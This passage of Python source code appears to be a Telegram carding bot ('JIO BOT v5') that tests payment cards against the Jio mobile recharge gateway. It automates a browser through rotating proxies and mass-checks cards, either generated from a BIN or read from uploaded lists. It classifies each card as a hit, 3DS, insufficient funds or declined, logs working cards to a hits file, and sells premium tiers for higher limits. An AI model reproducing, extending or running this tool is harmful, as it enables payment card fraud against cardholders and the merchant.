                f"{E['card']} <b>Card</b> ➤ <code>{card_label(card)}</code>\n"
                f"{E['bolt']} <b>Elapsed</b> ➤ {elapsed}s",
                message.chat.id, msg.message_id, parse_mode="HTML")
        except: pass

    proxy = get_random_proxy()
    holder = {"st": None, "resp": None}

    def runner():
        try:
            st, resp = run_one_check(phone, amount, card, proxy_str=proxy)
            holder["st"] = st; holder["resp"] = resp
        except Exception as e:
            holder["st"] = "error"; holder["resp"] = f"Failed: {str(e)[:120]}"

    t = threading.Thread(target=runner, daemon=True)
    t.start()

    stages = [
        (3,"Step 1/5","Launching browser"),(10,"Step 2/5","Loading Jio page"),
        (20,"Step 3/5","Fetching plans"),(35,"Step 4/5","Filling card form"),
        (55,"Step 5/5","Submitting payment"),(80,"Step 5/5","Awaiting bank response"),
    ]
    start_t = time.time(); shown = set()
    while t.is_alive():
        elapsed = int(time.time() - start_t)
        for secs, step, text in stages:
            if elapsed >= secs and secs not in shown:
                shown.add(secs); update_step(step, text, elapsed); break
        time.sleep(2)
    t.join(timeout=5)
    status = holder["st"] or "error"
    response = holder["resp"] or "No response"

    if is_admin(uid): rk = " [ADMIN]"
    elif is_premium(uid): rk = " [PREMIUM]"
    else: rk = " [FREE]"

    safe = str(response).replace("<","").replace(">","").replace("&","")
    safe_name = str(message.from_user.first_name).replace("<","").replace(">","").replace("&","")

    if status == "success":
        with open(HITS_FILE, 'a', encoding="utf-8") as f:
            f.write(f"{phone} Rs{amount} {card_label(card)} - {response}\n")

    head = styled_result_head(status)
    res = (
        f"{head}\n{SEP}\n"
        f"{E['phone']} <b>Phone</b> ➤ <code>{phone}</code>\n"
        f"{E['money']} <b>Amount</b> ➤ ₹{amount}\n"
        f"{E['card']} <b>Card</b> ➤ <code>{card_label(card)}</code>\n"
        f"{E['bolt']} <b>Response</b> ➤ {safe}\n"
        f"{E['globe']} <b>Gateway</b> ➤ Jio Recharge\n{SEP}\n"
        f"{E['eye']} <b>User</b> ➤ {safe_name}{rk}"
    )
    try: bot.delete_message(message.chat.id, msg.message_id)
    except: pass
    try: bot.reply_to(message, res, parse_mode="HTML")
    except:
        try: bot.reply_to(message, res.replace("<code>","").replace("</code>",""))
        except: pass

@bot.message_handler(commands=['mjio'])
def mjio_mass(message):
    uid = message.from_user.id
    if is_banned(uid):
        bot.reply_to(message, f"{E['cross']} <b>You are banned.</b>", parse_mode="HTML"); return
    add_user(uid)

    limit = ADMIN_LIMIT if is_admin(uid) else (PREMIUM_LIMIT if is_premium(uid) else FREE_LIMIT)
    if limit == 0:
        bot.reply_to(message, f"{E['warn']} <b>Free users cannot use mass check.</b>", parse_mode="HTML"); return
    if ACTIVE_USERS_MPP.get(uid):
        bot.reply_to(message, f"{E['warn']} <b>Mass check already running.</b>", parse_mode="HTML"); return

    args = message.text.split()
    cards = []; phone = amount = None

    if len(args) >= 5:
        phone, amount, bin_str = args[1], args[2], args[3]
        try: count = int(args[4])
        except: count = 5
        count = min(count, limit)
        cards = generate_cards(bin_str, "12", "2029", count)
    elif len(args) >= 3 and message.reply_to_message and message.reply_to_message.document:
        phone, amount = args[1], args[2]
        fi = bot.get_file(message.reply_to_message.document.file_id)
        raw = bot.download_file(fi.file_path)
        for l in raw.decode('utf-8', errors='ignore').splitlines():
            c = parse_card_line(l)
            if c: cards.append(c)
        if not cards:
            bot.reply_to(message, f"{E['cross']} <b>No valid cards in file.</b>", parse_mode="HTML"); return
        cards = cards[:limit]
    else:
        bot.reply_to(message,
            f"{E['box']} <b>Usage:</b>\n"
            f"<code>/mjio &lt;phone&gt; &lt;amount&gt; &lt;bin&gt; &lt;count&gt;</code>\n"
            f"OR reply .txt with: <code>/mjio &lt;phone&gt; &lt;amount&gt;</code>",
            parse_mode="HTML"); return

    if not _CHROMIUM_READY.is_set():
        wait_msg = bot.reply_to(message, f"{E['clock']} <b>Chromium not ready. Waiting (max 3 min)...</b>", parse_mode="HTML")
        if not _CHROMIUM_READY.wait(timeout=180):
            try: bot.delete_message(message.chat.id, wait_msg.message_id)
            except: pass
            bot.reply_to(message, f"{E['cross']} <b>Chromium not ready. Try again.</b>", parse_mode="HTML")
            return
        try: bot.delete_message(message.chat.id, wait_msg.message_id)
        except: pass

    job_id = f"{int(time.time())}{random.randint(100,999)}"
    ACTIVE_JOBS[job_id] = True
    ACTIVE_USERS_MPP[uid] = True
    total = len(cards)

    results = {"hits":0,"hits_list":[],"declined":0,"declined_list":[],
               "3ds":0,"3ds_list":[],"error":0,"error_list":[],"checked":0,
               "insufficient":0,"insufficient_list":[]}
    start_time = time.time()
    ulock = threading.Lock()
    rk = " [ADMIN]" if is_admin(uid) else (" [PREMIUM]" if is_premium(uid) else " [FREE]")

    def cap(done=False, stopped=False):
        el = int(time.time() - start_time); m, s = divmod(el, 60)
        if stopped: st = f"{E['warn']} Stopped\n"
        elif done: st = f"{E['check']} Completed\n"
        else: st = ""
        return (f"{E['chart']} <b>MASS JIO RECHARGE</b>\n{SEP}\n{st}"
                f"┣ {E['box']} Progress ➜ {results['checked']}/{total}\n"
                f"┣ {E['check']} Hits ➜ {results['hits']}\n"
                f"┣ {E['fire']} 3DS ➜ {results['3ds']}\n"
                f"┣ {E['cash']} Insufficient ➜ {results['insufficient']}\n"
                f"┣ {E['cross']} Declined ➜ {results['declined']}\n"
                f"┣ {E['warn']} Errors ➜ {results['error']}\n"
                f"┗ {E['clock']} Time ➜ {m:02d}:{s:02d}\n{SEP}\n"
                f"{E['eye']} <b>User:</b> {message.from_user.first_name}{rk}\n"
                f"{E['box']} <b>Job ID:</b> <code>{job_id}</code>")

    def mkup(done=False):
        m = telebot.types.InlineKeyboardMarkup()
        if not done:
            m.add(telebot.types.InlineKeyboardButton(f"{E['cross']} STOP", callback_data=f"stop_{job_id}"))
        return m

    prog = bot.reply_to(message, cap(), parse_mode="HTML", reply_markup=mkup())

    def worker(card, proxy):
        if not ACTIVE_JOBS.get(job_id): return None
        try:
            status, response = run_one_check(phone, amount, card, proxy_str=proxy)
        except Exception as e:
            tb = traceback.format_exc()
            print(f"[mjio] worker exception:\n{tb}")
            status, response = "error", f"Worker: {str(e)[:100]}"
        entry = f"{card_label(card)} - {response}"

        with ulock:
            if status == "success":
                results["hits"] += 1; results["hits_list"].append(entry)
                try:
                    with open(HITS_FILE, 'a', encoding="utf-8") as f:
                        f.write(f"{phone} Rs{amount} {card_label(card)} - {response}\n")
                except: pass
            elif status == "3ds":
                results["3ds"] += 1; results["3ds_list"].append(entry)
            elif status == "insufficient":
                results["insufficient"] += 1; results["insufficient_list"].append(entry)
            elif status in ("expired","invalid_cvv","invalid_card","issuer_decline","blocked",
                            "not_permitted","limit_exceeded","velocity","processor_error","failed"):
                results["declined"] += 1; results["declined_list"].append(entry)
            else:
                results["error"] += 1; results["error_list"].append(entry)
            results["checked"] += 1

        if status in ("success", "3ds", "insufficient"):
            safe = str(response).replace("<","").replace(">","").replace("&","")
            safe_name = str(message.from_user.first_name).replace("<","").replace(">","").replace("&","")
            single = (
                f"{styled_result_head(status)}\n{SEP}\n"
                f"{E['phone']} <b>Phone</b> ➤ <code>{phone}</code>\n"
                f"{E['money']} <b>Amount</b> ➤ ₹{amount}\n"
                f"{E['card']} <b>Card</b> ➤ <code>{card_label(card)}</code>\n"
                f"{E['bolt']} <b>Response</b> ➤ {safe}\n"
                f"{E['globe']} <b>Gateway</b> ➤ Jio Recharge\n{SEP}\n"
                f"{E['eye']} <b>User</b> ➤ {safe_name}{rk}"
            )
            try:
                bot.send_message(message.chat.id, single, parse_mode="HTML")
                time.sleep(random.uniform(0.5, 1.0))
            except: pass

        try:
            bot.edit_message_text(cap(), message.chat.id, prog.message_id,
                                  parse_mode="HTML", reply_markup=mkup())
        except: pass
        return status

    def runner_all():
        was_stopped = False
        try:
            for c in cards:
                if not ACTIVE_JOBS.get(job_id):
                    was_stopped = True; break
                proxy = get_random_proxy()
                worker(c, proxy)
        except Exception as e:
            tb = traceback.format_exc()
            print(f"[mjio] runner exception:\n{tb}")
        finally:
            ACTIVE_JOBS.pop(job_id, None)
            ACTIVE_USERS_MPP[uid] = False
            try:
                bot.edit_message_text(cap(done=not was_stopped, stopped=was_stopped),
                                      message.chat.id, prog.message_id,
                                      parse_mode="HTML", reply_markup=mkup(done=True))
            except: pass
            try:
                lines = []
                for sec, lbl in [("hits_list","HITS"),("3ds_list","3DS"),
                                 ("insufficient_list","INSUFFICIENT FUNDS"),
                                 ("declined_list","DECLINED"),("error_list","ERRORS")]:
                    if results.get(sec):
                        lines.append(f"=== {lbl} ===")
                        lines.extend(results[sec]); lines.append("")
                content = "\n".join(lines) if lines else "No results."
                fcap = (f"{E['chart']} <b>Results</b>\n{SEP_THIN}\n"
                        f"┣ {E['check']} Hits ➜ {results['hits']}\n"
                        f"┣ {E['fire']} 3DS ➜ {results['3ds']}\n"
                        f"┣ {E['cash']} Insufficient ➜ {results['insufficient']}\n"
                        f"┣ {E['cross']} Declined ➜ {results['declined']}\n"
                        f"┣ {E['warn']} Errors ➜ {results['error']}\n"
                        f"┗ {E['box']} Total ➜ {results['checked']}")
                path = "JioResults.txt"
                with open(path, "w", encoding="utf-8") as f: f.write(content)
                with open(path, "rb") as f:
                    bot.send_document(message.chat.id, f, caption=fcap, parse_mode="HTML")
                try: os.remove(path)
                except: pass
            except Exception as e:
                print(f"[mjio] results send failed: {e}")

    threading.Thread(target=runner_all, daemon=True).start()

@bot.callback_query_handler(func=lambda c: c.data.startswith("stop_"))
def cb_stop(call):
    jid = call.data[5:]
    uid = call.from_user.id
    try:
        if jid in ACTIVE_JOBS:
            ACTIVE_JOBS[jid] = False
            ACTIVE_USERS_MPP[uid] = False
            bot.answer_callback_query(call.id, f"{E['cross']} Stopping...")
        else:
            bot.answer_callback_query(call.id, "Job not running")
    except: pass

@bot.message_handler(commands=['info'])
def user_info(message):
    uid = str(message.from_user.id)
    role, limit, exp = "[FREE]", FREE_LIMIT, "NEVER"
    if is_admin(int(uid)):
        role, limit, exp = "[ADMIN]", ADMIN_LIMIT, "Lifetime"
    elif is_premium(int(uid)):
        role, limit = "[PREMIUM]", PREMIUM_LIMIT
        with open(PREMIUM_FILE, 'r') as f:
            for line in f:
                if line.startswith(uid + "|"):
                    e = float(line.strip().split('|')[1])
                    exp = "Lifetime" if e == 0 else datetime.datetime.fromtimestamp(e).strftime('%Y-%m-%d %H:%M:%S')
                    break
    bot.reply_to(message,
        f"{E['eye']} <b>ACCOUNT INFO</b>\n{SEP}\n"
        f"{E['gem']} <b>ID</b> ➤ <code>{uid}</code>\n"
        f"{E['crown']} <b>Rank</b> ➤ {role}\n"
        f"{E['clock']} <b>Expires</b> ➤ {exp}\n"
        f"{E['target']} <b>Mass Limit</b> ➤ {limit}\n{SEP}",
        parse_mode="HTML")

# =====================================================================
# ADMIN
# =====================================================================
@bot.message_handler(commands=['addpremium', 'premium'])
def add_prem(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, f"{E['cross']} <b>Admin only.</b>", parse_mode="HTML"); return
    try:
        p = message.text.split()
        if len(p) < 3:
            bot.reply_to(message, f"{E['box']} <code>/addpremium &lt;id&gt; &lt;duration&gt;</code>", parse_mode="HTML"); return
        tid, dur = p[1], p[2]
        exp = parse_duration(dur)
        if exp is None:
            bot.reply_to(message, f"{E['cross']} <b>Invalid duration:</b> {dur}", parse_mode="HTML"); return
        if add_premium(tid, exp):
            dur_str = "Lifetime" if exp == 0 else dur
            bot.reply_to(message, f"{E['check']} <b>Premium added</b> ➜ <code>{tid}</code> ({dur_str})", parse_mode="HTML")
            try: bot.send_message(int(tid), f"{E['crown']} <b>Premium added!</b>\nDuration: {dur_str}", parse_mode="HTML")
            except: pass
        else:
            bot.reply_to(message, f"{E['cross']} <b>Failed.</b>", parse_mode="HTML")
    except Exception as e:
        bot.reply_to(message, f"{E['cross']} <b>Error:</b> {str(e)[:100]}", parse_mode="HTML")

@bot.message_handler(commands=['rmpremium', 'unpremium'])
def rm_prem(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, f"{E['cross']} <b>Admin only.</b>", parse_mode="HTML"); return
    try:
        tid = message.text.split()[1]
        if remove_premium(tid):
            bot.reply_to(message, f"{E['check']} <b>Premium removed</b> ➜ <code>{tid}</code>", parse_mode="HTML")
        else:
            bot.reply_to(message, f"{E['cross']} <b>Failed.</b>", parse_mode="HTML")
    except: bot.reply_to(message, f"{E['box']} <code>/rmpremium &lt;id&gt;</code>", parse_mode="HTML")

@bot.message_handler(commands=['ban'])
def ban_user(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, f"{E['cross']} <b>Admin only.</b>", parse_mode="HTML"); return
    try:
        p = message.text.split()
        tid = p[1]
        dur = p[2] if len(p) > 2 else 'lifetime'
        exp = parse_duration(dur)
        if exp is None:
            bot.reply_to(message, f"{E['cross']} <b>Invalid duration.</b>", parse_mode="HTML"); return
        with open(BANNED_FILE, 'a') as f: f.write(f"{tid}|{exp}\n")
        bot.reply_to(message, f"{E['check']} <b>Banned</b> ➜ <code>{tid}</code> ({dur})", parse_mode="HTML")
    except: bot.reply_to(message, f"{E['box']} <code>/ban &lt;id&gt; &lt;duration&gt;</code>", parse_mode="HTML")

@bot.message_handler(commands=['unban'])
def unban_user(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, f"{E['cross']} <b>Admin only.</b>", parse_mode="HTML"); return
    try:
        tid = message.text.split()[1]
        with open(BANNED_FILE, 'r') as f: lines = f.readlines()
        with open(BANNED_FILE, 'w') as f:
            for l in lines:
                if not l.startswith(tid + "|"): f.write(l)
        bot.reply_to(message, f"{E['check']} <b>Unbanned</b> ➜ <code>{tid}</code>", parse_mode="HTML")
    except: bot.reply_to(message, f"{E['box']} <code>/unban &lt;id&gt;</code>", parse_mode="HTML")

@bot.message_handler(commands=['stats'])
def bot_stats(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, f"{E['cross']} <b>Admin only.</b>", parse_mode="HTML"); return
    with open(USERS_FILE, 'r') as f: uc = len(f.read().splitlines())
    with open(PREMIUM_FILE, 'r') as f: pc = len(f.read().splitlines())
    with open(BANNED_FILE, 'r') as f: bc = len(f.read().splitlines())
    with open(HITS_FILE, 'r') as f: hc = len(f.read().splitlines())
    ready = f"{E['check']} Ready" if _CHROMIUM_READY.is_set() else f"{E['clock']} Installing"
    bot.reply_to(message,
        f"{E['chart']} <b>BOT STATISTICS</b>\n{SEP}\n"
        f"{E['check']} <b>Total Hits</b> ➤ {hc}\n"
        f"{E['eye']} <b>Users</b> ➤ {uc}\n"
        f"{E['crown']} <b>Premium</b> ➤ {pc}\n"
        f"{E['cross']} <b>Banned</b> ➤ {bc}\n"
        f"{E['shield']} <b>Browser</b> ➤ {ready}\n"
        f"{E['box']} <b>Active Jobs</b> ➤ {len(ACTIVE_JOBS)}\n{SEP}",
        parse_mode="HTML")

# =====================================================================
# MAIN
# =====================================================================
if __name__ == "__main__":
    print("JIO BOT v5 IS RUNNING...\n")
    _kill_zombie_browsers()
    print("[BOOT] Zombie browsers cleared")
    print("[BOOT] Browser pool will start on first check\n")
    while True:
        try:
            bot.polling(non_stop=True, timeout=60)
        except Exception as e:
            print(f"Polling error: {e}")
            time.sleep(5)
